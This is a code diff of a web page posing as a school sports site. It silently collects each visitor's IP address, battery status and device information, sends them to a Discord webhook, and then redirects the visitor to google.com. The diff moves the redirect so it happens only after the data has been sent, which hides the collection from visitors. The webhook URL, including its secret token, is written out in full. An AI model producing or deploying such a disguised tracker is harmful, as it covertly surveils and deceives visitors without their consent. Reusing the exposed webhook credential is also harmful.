@@ -4,12 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>School Website Sport</title>
-    <script>
-        // Check if the current URL starts with the GitHub Pages URL, and redirect if it does
-        if (window.location.href.startsWith("https://sparkkkkie.github.io/")) {
-            window.location.href = "https://www.google.com";
-        }
-    </script>
 </head>
 
 <body>
@@ -17,6 +11,7 @@
     <script>
         // Replace with your Discord webhook URL
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
+        const redirectURL = 'https://www.google.com';
 
         // Function to get IP address
         function getIPAddress() {
@@ -69,7 +64,7 @@
             `;
         }
 
-        // Function to send data to the Discord webhook
+        // Function to send data to the Discord webhook and then redirect
         function sendToDiscord(ip, battery, deviceInfo) {
             const payload = {
                 embeds: [{
@@ -91,13 +86,15 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
+                    // Redirect to the specified URL after successful logging
+                    window.location.href = redirectURL;
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
             }).catch(error => console.error('Error sending to webhook:', error));
         }
 
-        // Execute functions and send data
+        // Execute functions and send data, then redirect
         Promise.all([getIPAddress(), getBatteryInfo()])
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
